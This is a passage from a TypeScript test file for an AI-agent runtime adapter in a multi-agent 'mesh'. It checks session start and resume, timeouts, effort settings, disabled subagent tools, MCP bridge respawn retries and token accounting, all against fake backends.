 * healthy — the pump never throws, so only the startup probe can catch it.
 */
function parkedQuery(): ClaudeAdapterOptions["queryFn"] {
  return (() => {
    const gen = (async function* () {
      // Never settles, and holds no timer or socket, so it cannot keep the
      // event loop alive after the test ends.
      await new Promise<never>(() => {});
    })();
    return Object.assign(gen, { interrupt: async () => undefined });
  }) as unknown as ClaudeAdapterOptions["queryFn"];
}

test("start defers judgement when a spawned backend never emits its init handshake", async () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "mesh-claude-"));
  try {
    const adapter = new ClaudeRuntimeAdapter({ queryFn: parkedQuery(), spawnFailureGraceMs: 25 });
    // Not a deferral by choice: `init` cannot arrive before the first pushed
    // message — verified against the SDK, where an unfed streaming query
    // answers control requests and emits nothing — so start() has no way to
    // tell a parked backend from a healthy one. It hands back a live session
    // and the turn dies later. Catching this belongs on the first turn.
    const started = await adapter.start(devDef, runtimeCtx(dir));
    assert.equal(started.agentId, devDef.id);
    assert.ok(started.sessionId, "a quiet spawn still yields a session id");
    await adapter.stopAll();
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test("restoreSession still tolerates a resume that stays quiet", async () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "mesh-claude-"));
  try {
    const adapter = new ClaudeRuntimeAdapter({ queryFn: parkedQuery(), spawnFailureGraceMs: 25 });
    const sessionId = "11111111-2222-3333-4444-555555555555";
    const restored = await adapter.restoreSession(devDef, sessionId, runtimeCtx(dir));
    // Asymmetric on purpose: whether the CLI re-emits `init` on resume is not
    // pinned down, and guessing wrong here costs a wasted turn rather than a
    // seat that never opens.
    assert.ok(restored, "a quiet resume must not be failed by the strict probe");
    assert.equal(restored.sessionId, sessionId);
    await adapter.stopAll();
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test("resume rebuilds the query that suspend tore down", async () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "mesh-claude-"));
  try {
    const adapter = new ClaudeRuntimeAdapter({ queryFn: parkedQuery(), spawnFailureGraceMs: 25 });
    const started = await adapter.start(devDef, runtimeCtx(dir));
    await adapter.suspend(started);
    assert.equal(await adapter.getStatus(started), "SUSPENDED");

    const revived = await adapter.resume(started, devDef, runtimeCtx(dir));
    // The session id is the transcript's name, so a rebuild that changed it
    // would silently strand every turn of history the agent had accumulated.
    assert.ok(revived, "resume must hand back a live session, not just a status");
    assert.equal(revived.sessionId, started.sessionId);
    assert.equal(await adapter.getStatus(started), "IDLE");
    await adapter.stopAll();
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test("resume reports null when the backend cannot be rebuilt", async () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "mesh-claude-"));
  try {
    const adapter = new ClaudeRuntimeAdapter({
      executablePath: path.join(dir, "no-such-claude"),
      spawnFailureGraceMs: 1000,
    });
    const orphan: AgentSession = {
      sessionId: "11111111-2222-3333-4444-555555555555",
      agentId: devDef.id,
      runtime: "claude",
      createdAt: new Date().toISOString(),
      handle: null,
    };
    // The old resume flipped this to IDLE and returned, so a seat whose
    // backend had gone away looked ready right up until its next turn died.
    assert.equal(await adapter.resume(orphan, devDef, runtimeCtx(dir)), null);
    await adapter.stopAll();
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test("a turn answered by total silence fails fast instead of riding the turn timeout", async () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "mesh-claude-"));
  try {
    const adapter = new ClaudeRuntimeAdapter({
      queryFn: parkedQuery(),
      spawnFailureGraceMs: 25,
      firstFrameTimeoutMs: 40,
      // Deliberately enormous by comparison. If the first-frame watchdog were
      // not carrying this, the test would hang for ten minutes rather than
      // fail — which is precisely the production symptom: a healthy-looking
      // session that answers a push with nothing at all, held open until the
      // backstop fires.
      turnTimeoutMs: 600000,
    });
    const started = await adapter.start(devDef, runtimeCtx(dir));
    const began = Date.now();
    await assert.rejects(
      () => adapter.send(started, agentInput("design the panel")),
      (err: unknown) => {
        // The "backend is gone" class, so the supervisor retries onto a fresh
        // spawn rather than reporting a step that simply failed.
        assert.ok(err instanceof BackendUnreachableError, `got ${String(err)}`);
        return true;
      },
    );
    assert.ok(Date.now() - began < 5000, "a mute backend must not be ridden to turnTimeoutMs");
    // The session is dropped rather than left open. A session kept alive here
    // is how orphaned `--resume` processes pile up against one transcript,
    // still working and still billing after the mesh stopped listening.
    await assert.rejects(() => adapter.send(started, agentInput("again")), BackendUnreachableError);
    await adapter.stopAll();
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

/**
 * Captures the SDK options an agent seat opens its query with.
 *
 * The seat path feeds a push queue rather than a single string, so unlike
 * `captureDesignerQuery` this one has to keep draining the prompt. The options
 * are recorded on OPEN, before any turn runs, which is all these tests assert.
 */
function captureSeatQuery() {
  const seen: Record<string, unknown>[] = [];
  const queryFn = (({ prompt, options }: { prompt: unknown; options: Record<string, unknown> }) => {
    seen.push(options);
    const gen = (async function* () {
      yield {
        type: "system",
        subtype: "init",
        session_id: String(options.sessionId ?? "seat-fake"),
        model: String(options.model ?? "claude-test"),
        mcp_servers: [{ name: "mesh", status: "connected" }],
      };
      for await (const msg of prompt as AsyncIterable<unknown>) void msg;
    })();
    return Object.assign(gen, { interrupt: async () => undefined });
  }) as unknown as ClaudeAdapterOptions["queryFn"];
  return { queryFn, seen };
}

test("an agent seat opens with its effort pinned, not the operator's", async () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "mesh-claude-"));
  try {
    const { queryFn, seen } = captureSeatQuery();
    const adapter = new ClaudeRuntimeAdapter({ queryFn });
    await adapter.start(devDef, runtimeCtx(dir));
    assert.equal(seen.length, 1, "opening a seat opens exactly one query");
    // Unset, the CLI falls back to the OPERATOR's personal effortLevel in
    // ~/.claude/settings.json, so the same mesh would think harder for one
    // operator than another and two runs of it would not be comparable.
    // Pinning makes a seat's reasoning depth a property of the mesh.
    assert.equal(seen[0].effort, "high");
    await adapter.stopAll();
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test("extraOptions still overrides the seat's effort pin", async () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "mesh-claude-"));
  try {
    const { queryFn, seen } = captureSeatQuery();
    // Spread BEFORE extraOptions deliberately: the pin must not close the
    // embedder escape hatch that already exists for `model`.
    const adapter = new ClaudeRuntimeAdapter({ queryFn, extraOptions: { effort: "low" } });
    await adapter.start(devDef, runtimeCtx(dir));
    assert.equal(seen[0].effort, "low", "the escape hatch still wins");
    await adapter.stopAll();
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test("a designer turn carries the effort its caller asked for", async () => {
  const { queryFn, seen } = captureDesignerQuery();
  const adapter = new ClaudeRuntimeAdapter({ queryFn });
  await adapter.prompt("hello", { system: "you are a designer", effort: "medium" });
  assert.equal(seen[0].effort, "medium", "a per-call effort must reach the query");
  await adapter.stopAll();
});

test("a designer turn that names no effort sends none", async () => {
  const { queryFn, seen } = captureDesignerQuery();
  const adapter = new ClaudeRuntimeAdapter({ queryFn });
  // Acceptance-criteria generation shares this path and runs on Haiku, which
  // has no effort support at all. Defaulting anything here would put the knob
  // on a call whose model cannot take it, so absence has to stay absence.
  await adapter.prompt("derive acceptance criteria", { system: "you are a designer" });
  assert.equal("effort" in seen[0], false, "no caller asked, so no effort is sent");
  await adapter.stopAll();
});

// ---- native subagent tools stay off, whatever extraOptions says --------------

test("a seat opens with the native Task and Agent tools removed", async () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "mesh-claude-"));
  try {
    const { queryFn, seen } = captureSeatQuery();
    const adapter = new ClaudeRuntimeAdapter({ queryFn });
    await adapter.start(devDef, runtimeCtx(dir));
    const disallowed = seen[0].disallowedTools as string[];
    assert.ok(disallowed.includes("Task") && disallowed.includes("Agent"), `got ${JSON.stringify(disallowed)}`);
    await adapter.stopAll();
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test("extraOptions.disallowedTools widens the seat's list but cannot re-enable Task or Agent", async () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "mesh-claude-"));
  try {
    const { queryFn, seen } = captureSeatQuery();
    // `extraOptions` is spread last, so a plain spread would have REPLACED the
    // list — silently handing a seat the tool that stalls a turn to timeout.
    const adapter = new ClaudeRuntimeAdapter({ queryFn, extraOptions: { disallowedTools: ["WebSearch"] } });
    await adapter.start(devDef, runtimeCtx(dir));
    assert.deepEqual([...(seen[0].disallowedTools as string[])].sort(), ["Agent", "Task", "WebSearch"]);
    await adapter.stopAll();
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test("a designer turn has Task and Agent removed too, and extraOptions cannot restore them", async () => {
  const plain = captureDesignerQuery();
  const a = new ClaudeRuntimeAdapter({ queryFn: plain.queryFn });
  await a.prompt("hello", { system: "you are a designer" });
  assert.deepEqual([...(plain.seen[0].disallowedTools as string[])].sort(), ["Agent", "Task"]);
  await a.stopAll();

  const widened = captureDesignerQuery();
  const b = new ClaudeRuntimeAdapter({ queryFn: widened.queryFn, extraOptions: { disallowedTools: ["Bash"] } });
  await b.prompt("hello", { system: "you are a designer" });
  assert.deepEqual([...(widened.seen[0].disallowedTools as string[])].sort(), ["Agent", "Bash", "Task"]);
  await b.stopAll();
});

// ---- ops only through MCP: no prose channel, and no mute seat ---------------

/**
 * A seat backend whose CLI reports `servers` at init and answers every push
 * with `resultText`. `initOnPush` emits init after the first push, as the real
 * streaming CLI does; otherwise it arrives when the query opens.
 *
 * `serversPerSpawn` models the startup race: the nth query this backend spawns
 * reports the nth entry (the last one repeats), so a test can have the first
 * spawn come up without a bridge and the replacement come up with one. `spawns`
 * counts the queries asked for, which is how the retry budget is observable,
 * and `seenOptions` is what each of them was opened with — `resume` or
 * `sessionId` — which is how the replacement's identity is observable.
 */
function seatQuery(
  servers: Array<{ name: string; status: string }>,
  resultText: string,
  opts: { initOnPush?: boolean; serversPerSpawn?: Array<Array<{ name: string; status: string }>> } = {},
) {
  const pushes: unknown[] = [];
  const seenOptions: Array<Record<string, unknown>> = [];
  let spawns = 0;
  const queryFn = (({ prompt, options }: { prompt: unknown; options: Record<string, unknown> }) => {
    seenOptions.push(options);
    const sdkSessionId = String(options.sessionId ?? options.resume ?? "seat-fake");
    const reported = opts.serversPerSpawn?.[spawns] ?? servers;
    spawns++;
    const init = { type: "system", subtype: "init", session_id: sdkSessionId, model: "claude-test", mcp_servers: reported };
    const gen = (async function* () {
      if (!opts.initOnPush) yield init;
      for await (const msg of prompt as AsyncIterable<unknown>) {
        pushes.push(msg);
        if (opts.initOnPush) yield init;
        yield {
          type: "result",
          subtype: "success",
          is_error: false,
          result: resultText,
          session_id: sdkSessionId,
          num_turns: 1,
          usage: { input_tokens: 10, output_tokens: 5, cache_read_input_tokens: 0, cache_creation_input_tokens: 0 },
        };
      }
    })();
    return Object.assign(gen, {
      interrupt: async () => undefined,
      setPermissionMode: async () => undefined,
      setModel: async () => undefined,
      supportedModels: async () => [],
      supportedCommands: async () => [],
      mcpServerStatus: async () => ({}),
    });
  }) as unknown as ClaudeAdapterOptions["queryFn"];
  return { queryFn, pushes, spawns: () => spawns, seenOptions };
}

test("a mesh-json block in the reply yields zero ops: ops arrive only as MCP tool calls", async () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "mesh-claude-"));
  const reply = ["Published the spec.", "```mesh-json", '[{"op":"publish_artifact","name":"Spec","type":"ArchitectureDocument","content":"x"},{"op":"done","summary":"declared"}]', "```"].join("\n");
  const { queryFn } = seatQuery([{ name: "mesh", status: "connected" }], reply);
  const adapter = new ClaudeRuntimeAdapter({ queryFn });
  const session = await adapter.start(devDef, runtimeCtx(dir));
  try {
    const out = await adapter.send(session, agentInput("go"));
    assert.deepEqual(out.operations, [], "the block is prose now; nothing is parsed out of it");
    assert.equal(out.typedOps, true);
    assert.equal(out.declaredSummary, undefined, "a `done` in prose declares nothing — only the mesh_done tool does");
    assert.equal(out.summary, "Published the spec.", "the summary is the reply's first line");
    assert.equal("parseWarnings" in out, false);
  } finally {
    await adapter.stop(session);
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

/** The real window is 30s (asserted below); the retry tests cannot spend it. */
const FAST_BRIDGE_DELAYS = [10, 10, 10, 10, 10];

test("the default bridge retry budget outlasts a restarting child's bridge, and is far inside the deadline", () => {
  assert.equal(BRIDGE_RESPAWN_DELAYS_MS.length, BRIDGE_RESPAWN_ATTEMPTS, "one delay per fresh spawn");
  const total = BRIDGE_RESPAWN_DELAYS_MS.reduce((a, b) => a + b, 0);
  // Measured 2026-09-27: after a child restart the bridge was still "failed" 12s
  // in, which the first 3-attempt/7s budget spent itself on.
  assert.ok(total > 12_000, `the window must outlast an unready bridge (got ${total}ms)`);
  assert.ok(total < 60_000, `and stay well inside the supervisor's 300s silence window (got ${total}ms)`);
});

test("a turn fails, after the retry budget, when every spawn reports the mesh bridge failed", async () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "mesh-claude-"));
  // The live shape: init arrives only after the turn's prompt is pushed. Every
  // spawn reports the same failure, so the retries cannot rescue it.
  const { queryFn, spawns } = seatQuery([{ name: "mesh", status: "failed" }], "I did lots of work", { initOnPush: true });
  const notices: Array<{ kind: string; message: string }> = [];
  const muted: unknown[] = [];
  const adapter = new ClaudeRuntimeAdapter({
    queryFn,
    turnTimeoutMs: 30_000,
    bridgeRespawnDelaysMs: FAST_BRIDGE_DELAYS,
    onNotice: (n) => notices.push(n),
    onMuteSuspected: (i) => muted.push(i),
  });
  const session = await adapter.start(devDef, runtimeCtx(dir));
  try {
    const started = Date.now();
    const err = await adapter.send(session, agentInput("go")).then(
      () => assert.fail("a seat with no bridge must not report a turn"),
      (e: Error) => e,
    );
    // Byte for byte the message this adapter has always raised: the retry
    // changes when it is said, never what it says.
    assert.equal(err.message, meshBridgeDownReason([{ name: "mesh", status: "failed" }]));
    const elapsed = Date.now() - started;
    assert.ok(elapsed < 12_000, `failed inside the bounded retry window, not at the turn timeout (took ${elapsed}ms)`);
    assert.equal(spawns(), 1 + BRIDGE_RESPAWN_ATTEMPTS, "one initial query plus a bounded number of fresh spawns");
    assert.equal(await adapter.getStatus(session).catch(() => "UNREACHABLE"), "UNREACHABLE", "the session is torn down so the retry respawns");
    // The race is not announced as a mute seat until the budget says the seat
    // really has no bridge — and then it is, once.
    assert.equal(muted.length, 1);
    const race = notices.filter((n) => n.kind === "mesh_bridge_race");
    assert.equal(race.length, 1, "one audit line, saying the turn waited and then gave up");
    assert.match(race[0]!.message, /bridge was not up at init \(status "failed"\)/);
    assert.match(race[0]!.message, new RegExp(`waited ${BRIDGE_RESPAWN_ATTEMPTS} fresh spawn\\(s\\) and was aborted`));
  } finally {
    await adapter.stop(session).catch(() => undefined);
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test("a bridge that is up by the next spawn has the race absorbed: the turn runs", async () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "mesh-claude-"));
  // The measured 2026-09-27 shape: the child restarted, the seat woke, and the
  // query it was given came up before the mesh bridge had attached. The next
  // spawn has it, so the turn must run rather than be discarded.
  const { queryFn, spawns, seenOptions } = seatQuery([{ name: "mesh", status: "failed" }], "the work landed", {
    initOnPush: true,
    serversPerSpawn: [[{ name: "mesh", status: "failed" }], [{ name: "mesh", status: "connected" }]],
  });
  const notices: Array<{ kind: string; message: string }> = [];
  const muted: unknown[] = [];
  const adapter = new ClaudeRuntimeAdapter({
    queryFn,
    bridgeRespawnDelaysMs: FAST_BRIDGE_DELAYS,
    onNotice: (n) => notices.push(n),
    onMuteSuspected: (i) => muted.push(i),
  });
  const session = await adapter.start(devDef, runtimeCtx(dir));
  try {
    let end: ClaudeTurnEnd | undefined;
    for await (const ev of adapter.stream(session, agentInput("go"))) {
      if (ev.kind === "turn_end") end = ev as ClaudeTurnEnd;
    }
    assert.ok(end, "the turn settled");
    assert.equal(end!.error, undefined, "a bridge that arrives on the second spawn is not a failed turn");
    assert.equal(end!.summary, "the work landed");
    assert.equal(end!.bridgeRespawns, 1, "the respawn is reported on the turn's own result");
    assert.equal(spawns(), 2, "one respawn, not a budget's worth");
    // The seat was started, not restored, so the query it lost held no
    // transcript: the replacement starts a new session rather than gambling on
    // resuming an id the CLI may not have written yet.
    assert.equal(seenOptions[1]!.resume, undefined);
    assert.notEqual(seenOptions[1]!.sessionId, seenOptions[0]!.sessionId);
    assert.equal(muted.length, 0, "a transient retry is not a mute seat");
    const race = notices.filter((n) => n.kind === "mesh_bridge_race");
    assert.equal(race.length, 1, "and the wait is still audited, so an operator can see the race happened");
    assert.match(race[0]!.message, /waited 1 fresh spawn\(s\) and then continued/);
    assert.equal(await adapter.getStatus(session), "IDLE", "the seat is between turns on the replacement query");
  } finally {
    await adapter.stop(session).catch(() => undefined);
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test("a bridge that is connected at init costs no extra spawn and no wait", async () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "mesh-claude-"));
  const { queryFn, spawns } = seatQuery([{ name: "mesh", status: "connected" }], "fine", { initOnPush: true });
  const notices: Array<{ kind: string }> = [];
  const adapter = new ClaudeRuntimeAdapter({ queryFn, onNotice: (n) => notices.push(n) });
  const session = await adapter.start(devDef, runtimeCtx(dir));
  try {
    const started = Date.now();
    const out = await adapter.send(session, agentInput("go"));
    assert.equal(out.error, undefined);
    assert.equal(spawns(), 1, "a bridge already up is never respawned");
    assert.equal(notices.filter((n) => n.kind === "mesh_bridge_race").length, 0, "and there is nothing to audit");
    assert.ok(Date.now() - started < 1_000, "no retry backoff on the healthy path");
  } finally {
    await adapter.stop(session);
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test("a seat with no mesh server registered still gets the retry window, then fails", async () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "mesh-claude-"));
  // Init arrives when the query opens, before any push: the send must refuse
  // rather than hand the model a turn it cannot act in — after the same bounded
  // retry a `status "failed"` bridge gets, because "not registered" is the same
  // startup question from this side.
  const { queryFn, pushes, spawns } = seatQuery([{ name: "some-other-tool", status: "connected" }], "ok");
  const adapter = new ClaudeRuntimeAdapter({ queryFn, bridgeRespawnDelaysMs: FAST_BRIDGE_DELAYS });
  const session = await adapter.start(devDef, runtimeCtx(dir));
  try {
    await assert.rejects(adapter.send(session, agentInput("go")), /mesh MCP bridge is not registered/);
    assert.equal(spawns(), 1 + BRIDGE_RESPAWN_ATTEMPTS);
    // A replacement query reports its bridge only once it has been pushed — the
    // CLI emits nothing before the first user message — so each fresh spawn
    // costs one prompt that produces no turn. The original query, whose init
    // had already landed, cost none.
    assert.equal(pushes.length, BRIDGE_RESPAWN_ATTEMPTS, "one probe push per respawn, none of them a turn");
  } finally {
    await adapter.stop(session).catch(() => undefined);
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test("a stop that lands during the retry window is not respawned over", async () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "mesh-claude-"));
  const { queryFn, spawns } = seatQuery([{ name: "mesh", status: "failed" }], "never lands", { initOnPush: true });
  const adapter = new ClaudeRuntimeAdapter({ queryFn });
  const session = await adapter.start(devDef, runtimeCtx(dir));
  try {
    const pending = adapter.send(session, agentInput("go"));
    // Long enough that the first attempt has failed (it fails on the init frame,
    // in milliseconds) and the 1s backoff is running — the window in which this
    // seat has no query to abort. Either way the stop lands, the turn is over:
    // the retry must not spawn a turn nobody is reading, whose ops would still
    // land on the mesh.
    await new Promise((resolve) => setTimeout(resolve, 250));
    await adapter.interrupt(session);
    await assert.rejects(pending, (e: Error) => /mesh MCP bridge|interrupted by the mesh/.test(e.message));
    assert.equal(spawns(), 1, "the stop is honored rather than respawned over");
  } finally {
    await adapter.stop(session).catch(() => undefined);
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test("a respawn of a restored seat re-resumes its transcript instead of dropping it", async () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "mesh-claude-"));
  const { queryFn, spawns, seenOptions } = seatQuery([{ name: "mesh", status: "failed" }], "still here", {
    initOnPush: true,
    serversPerSpawn: [[{ name: "mesh", status: "failed" }], [{ name: "mesh", status: "connected" }]],
  });
  const adapter = new ClaudeRuntimeAdapter({ queryFn });
  const resumedId = "11111111-1111-4111-8111-111111111111";
  // A seat restored from the registry holds a transcript on disk. Losing it to
  // absorb a startup race would silently take everything the seat remembers, so
  // the replacement has to be a resume of the same session, not a blank one.
  const session = await adapter.restoreSession(devDef, resumedId, runtimeCtx(dir));
  assert.ok(session, "the stored session was restored");
  try {
    const out = await adapter.send(session!, agentInput("go"));
    assert.equal(out.error, undefined, "the race was absorbed");
    assert.equal(spawns(), 2);
    assert.equal(seenOptions[0]!.resume, resumedId, "the first query resumed the stored transcript");
    assert.equal(seenOptions[1]!.resume, resumedId, "and its replacement resumes the same one");
    assert.equal(seenOptions[1]!.sessionId, undefined, "a resumed query names `resume`, never `sessionId`");
  } finally {
    await adapter.stop(session!).catch(() => undefined);
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test("a bridge still pending at init does not fail the turn", async () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "mesh-claude-"));
  const { queryFn, spawns } = seatQuery([{ name: "mesh", status: "pending" }], "working on it", { initOnPush: true });
  const adapter = new ClaudeRuntimeAdapter({ queryFn });
  const session = await adapter.start(devDef, runtimeCtx(dir));
  try {
    const out = await adapter.send(session, agentInput("go"));
    assert.equal(out.error, undefined);
    assert.equal(out.summary, "working on it");
    // `pending` is the CLI still dialling, not a bridge that is down.
    assert.equal(spawns(), 1, "a still-connecting bridge is never respawned");
  } finally {
    await adapter.stop(session);
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test("usageToTokens reports reasoning without billing it a second time", () => {
  const t = usageToTokens({
    input_tokens: 100,
    output_tokens: 400,
    cache_creation_input_tokens: 50,
    cache_read_input_tokens: 900,
    output_tokens_details: { thinking_tokens: 300 },
  });
  assert.equal(t.thinking, 300);
  // The backend bills reasoning INSIDE output_tokens, so 300 of those 400
  // already carry it. Summing `thinking` in would charge for the same tokens
  // twice — the failure the cache_read exclusion exists to avoid.
  assert.equal(t.total, 100 + 400 + 50);
  assert.equal(t.cacheRead, 900, "and the cache_read exclusion is untouched");
});

test("usageToTokens tells 'no reasoning reported' apart from 'none used'", () => {
  // Older CLI builds omit the object entirely and the wire type allows null.
  // Those both mean UNKNOWN, so neither may be reported as 0: a turn that did
  // not think and a turn we cannot measure are different facts, and collapsing
  // them is what makes the number useless for tuning effort.
  assert.equal("thinking" in usageToTokens({ input_tokens: 1, output_tokens: 2 }), false);
  assert.equal("thinking" in usageToTokens({ input_tokens: 1, output_tokens: 2, output_tokens_details: null }), false);
  assert.equal(
    "thinking" in usageToTokens({ input_tokens: 1, output_tokens: 2, output_tokens_details: { thinking_tokens: null } }),
    false,
  );
  // A reported zero IS a measurement, so it is kept rather than dropped.
  const measured = usageToTokens({ input_tokens: 1, output_tokens: 2, output_tokens_details: { thinking_tokens: 0 } });
  assert.equal("thinking" in measured, true);
  assert.equal(measured.thinking, 0);
});
